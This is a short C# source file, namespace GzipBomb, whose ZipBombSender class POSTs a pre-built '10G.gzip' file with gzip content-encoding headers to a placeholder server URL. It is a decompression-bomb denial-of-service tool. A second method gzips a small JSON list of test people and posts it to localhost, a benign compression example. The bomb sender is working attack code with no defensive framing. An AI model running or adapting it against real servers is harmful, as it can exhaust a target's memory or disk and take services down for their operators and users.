
namespace GzipBomb
{


    // https://stackoverflow.com/questions/11414987/what-header-should-be-used-for-sending-gzip-compressed-json-from-android-client
    // https://stackoverflow.com/questions/30310099/correct-way-to-compress-webapi-post
    public class PersonModel
    {
        public string FirstName;
        public string LastName;
        public int Age;
    }


    public class ZipBombSender
    {

        // https://stackoverflow.com/questions/11414987/what-header-should-be-used-for-sending-gzip-compressed-json-from-android-client
        public async System.Threading.Tasks.Task<string> Post()
        {
            string text = null;
            byte[] data = System.IO.File.ReadAllBytes("10G.gzip");

            using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
            {
                client.DefaultRequestHeaders.Add("Content-Encoding", "gzip");

                using (System.IO.Stream ms = new System.IO.MemoryStream(data))
                {
                    using (System.Net.Http.StreamContent streamContent = new System.Net.Http.StreamContent(ms))
                    {

                        streamContent.Headers.Add("Content-Encoding", "gzip");
                        streamContent.Headers.ContentLength = ms.Length;

                        System.Uri target = new System.Uri("http://yourServer/yourPage");
                        using (System.Net.Http.HttpRequestMessage requestMessage = new System.Net.Http.HttpRequestMessage(System.Net.Http.HttpMethod.Post, target))
                        {
                            requestMessage.Content = streamContent;
                            using (System.Net.Http.HttpResponseMessage response = await client.SendAsync(requestMessage))
                            {
                                text = await response.Content.ReadAsStringAsync();
                            } // End using response 

                        } // End Using requestMessage 

                    } // End Using streamContent 

                } // End Using ms 

            } // End Using client 

            return text;
        } // End Sub Post 


        public async System.Threading.Tasks.Task<int?> Get()
        {
            System.Collections.Generic.List<PersonModel> people = 
                new System.Collections.Generic.List<PersonModel>
            {
                new PersonModel
                {
                    FirstName = "Test",
                    LastName = "One",
                    Age = 25
                },
                new PersonModel
                {
                    FirstName = "Test",
                    LastName = "Two",
                    Age = 45
                }
            };

            using (System.Net.Http.HttpClientHandler handler = new System.Net.Http.HttpClientHandler())
            {
                handler.AutomaticDecompression = System.Net.DecompressionMethods.GZip | System.Net.DecompressionMethods.Deflate;
                using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient(handler, false))
                {
                    string json = Newtonsoft.Json.JsonConvert.SerializeObject(people);
                    byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
                    System.IO.MemoryStream ms = new System.IO.MemoryStream();
                    using (System.IO.Compression.GZipStream gzip =
                        new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress, true))
                    {
                        gzip.Write(jsonBytes, 0, jsonBytes.Length);
                    }
                    ms.Position = 0;
                    System.Net.Http.StreamContent content = new System.Net.Http.StreamContent(ms);
                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
                    content.Headers.ContentEncoding.Add("gzip");
                    System.Net.Http.HttpResponseMessage response = await client.PostAsync("http://localhost:54425/api/Gzipping", content);

                    // System.Collections.Generic.IEnumerable<PersonModel> results = await response.Content.ReadAsAsync<System.Collections.Generic.IEnumerable<PersonModel>>();
                    string result = await response.Content.ReadAsStringAsync();
                    System.Collections.Generic.IEnumerable<PersonModel> results = Newtonsoft.Json.JsonConvert.
                        DeserializeObject<System.Collections.Generic.IEnumerable<PersonModel>>(result);

                    System.Diagnostics.Debug.WriteLine(string.Join(", ", results));
                }
            }

            return null;
        }


    }


}
